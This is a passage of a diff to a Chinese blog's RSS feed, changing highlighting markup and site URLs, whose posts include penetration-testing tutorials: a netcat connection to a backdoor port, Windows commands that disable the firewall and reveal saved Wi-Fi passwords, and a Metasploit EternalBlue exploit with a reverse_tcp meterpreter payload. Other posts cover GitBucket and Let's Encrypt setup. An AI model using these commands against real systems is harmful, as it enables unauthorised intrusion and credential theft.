 &lt;span class=&quot;c&quot;&gt;# 重启目标电脑，使用nc连接&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;C:\WINDOWS&amp;gt; &lt;/span&gt;nc -nv 192.168.0.101 4445
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;INDOWS&amp;gt; nc &lt;span class=&quot;nt&quot;&gt;-nv&lt;/span&gt; 192.168.0.101 4445
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Sat, 11 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/netcat-general/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/netcat-general/</guid>  
+               <link>http://localhost:4000/2017/11/netcat-general/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/netcat-general/</guid>  
                </item>  
           
             <item>  
@@ -456,10 +439,9 @@ msf &amp;gt; shell
 
 &lt;p&gt;下载地址：&lt;a href=&quot;https://github.com/gitbucket/gitbucket/releases&quot;&gt;https://github.com/gitbucket/gitbucket/releases&lt;/a&gt; (需要翻墙)&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 启动&lt;/span&gt;
-java -jar gitbucket.war
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 启动&lt;/span&gt;
+java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; gitbucket.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;访问地址&quot;&gt;访问地址&lt;/h2&gt;
 
@@ -474,8 +456,8 @@ java -jar gitbucket.war
 &lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/screenshot-plugin_system.png&quot; alt=&quot;gitbucker&quot; /&gt;&lt;/p&gt;
 </description>  
                <pubDate>Mon, 30 Oct 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/10/quick-build-gitbucker/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/10/quick-build-gitbucker/</guid>  
+               <link>http://localhost:4000/2017/10/quick-build-gitbucker/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/quick-build-gitbucker/</guid>  
                </item>  
           
             <item>  
@@ -498,7 +480,7 @@ java -jar gitbucket.war
 
 &lt;h2 id=&quot;命令明细&quot;&gt;命令明细&lt;/h2&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 关闭防火墙
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 关闭防火墙
 netsh advfirewall set allprofiles state off
 netsh firewall set opmode disable
 
@@ -526,12 +508,11 @@ net user vinny$ /delete
 # 查看目标机器保存的无线热点和密码
 netsh wlan show profile
 netsh wlan show profile name=&quot;menote2&quot; key=clear
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/10/windows-useful-cmds/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/10/windows-useful-cmds/</guid>  
+               <link>http://localhost:4000/2017/10/windows-useful-cmds/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/windows-useful-cmds/</guid>  
                </item>  
           
             <item>  
@@ -567,29 +548,27 @@ netsh wlan show profile name=&quot;menote2&quot; key=clear
 
 &lt;p&gt;这里以内网扫描进行测试，所有扫描内网中所有主机，并检查其是否存在此漏洞。&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/smb/smb_ms17_010
-msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 192.168.1.0/24
-msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;THREADS 100
-msf &amp;gt; exploit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/smb/smb_ms17_010
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 192.168.1.0/24
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;THREADS 100
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;漏洞攻击&quot;&gt;漏洞攻击&lt;/h2&gt;
 
 &lt;p&gt;确定好目标主机后，就可以使用启动监听并进行攻击&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/smb/ms17_010_eternalblue
-msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
-msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 192.168.1.15
-msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
-msf &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.1.110
-msf &amp;gt; exploit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 192.168.1.15
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4444
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 192.168.1.110
+msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>  
                <pubDate>Sat, 28 Oct 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/10/ms17-010-eternalblue/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/10/ms17-010-eternalblue/</guid>  
+               <link>http://localhost:4000/2017/10/ms17-010-eternalblue/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/ms17-010-eternalblue/</guid>  
                </item>  
           
             <item>  
@@ -617,27 +596,25 @@ msf &amp;gt; exploit
 
 &lt;p&gt;下载Github上贡献者做好的安装脚本，如下：&lt;/p&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.conf
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.conf
 wget https://raw.githubusercontent.com/xdtianyu/scripts/master/lets-encrypt/letsencrypt.sh
 
 &lt;span class=&quot;c&quot;&gt;# 赋予执行权限&lt;/span&gt;
-chmod +x letsencrypt.sh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x letsencrypt.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;配置相关信息&quot;&gt;配置相关信息&lt;/h2&gt;
 
 &lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;vi letsencrypt.conf&lt;/code&gt;打开配置文件，将里面的 &lt;strong&gt;example.com&lt;/strong&gt; 换成自己的域名，如下：&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# only modify the values, key files will be generated automaticly.
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# only modify the values, key files will be generated automaticly.
 ACCOUNT_KEY=&quot;letsencrypt-account.key&quot;
 DOMAIN_KEY=&quot;tiger.com.key&quot;
 DOMAIN_DIR=&quot;/usr/local/openresty/nginx/html&quot;
 DOMAINS=&quot;DNS:test.tiger.com&quot;
 #ECC=TRUE
 #LIGHTTPD=TRUE
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;按以往免费申请ssl的经历，通常都需要验证域名的所属权，不是通过配置二级域名验证就是需要在网站根目录上传验证文件，经过试用 &lt;strong&gt;Lets Encrypt&lt;/strong&gt;，发现它使用的是第二种方式。&lt;/p&gt;
 
@@ -647,25 +624,23 @@ DOMAINS=&quot;DNS:test.tiger.com&quot;
 
 &lt;h2 id=&quot;执行证书生成&quot;&gt;执行证书生成&lt;/h2&gt;
 
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./letsencrypt.sh ./letsencrypt.conf
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./letsencrypt.sh ./letsencrypt.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;没有什么错误就会生成如下的几个文件，其中&lt;strong&gt;tiger.chained.crt&lt;/strong&gt;和&lt;strong&gt;tiger.com.key&lt;/strong&gt;就是需要的文件。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;letsencrypt-account.key
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;letsencrypt-account.key
 tiger.crt
 tiger.csr
 tiger.chained.crt
 tiger.com.key
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;配置证书安装&quot;&gt;配置证书安装&lt;/h2&gt;
 
 &lt;p&gt;这里使用nginx进行证书安装的服务器&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
 	listen       443;
 	server_name  test.tiger.com;
 
@@ -679,13 +654,12 @@ tiger.com.key
         index  index.html index.htm;
     }
 }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 </description>  
                <pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/10/lets-encrypt-ssl/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/10/lets-encrypt-ssl/</guid>  
+               <link>http://localhost:4000/2017/10/lets-encrypt-ssl/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/10/lets-encrypt-ssl/</guid>  
                </item>  
           
     </channel>  
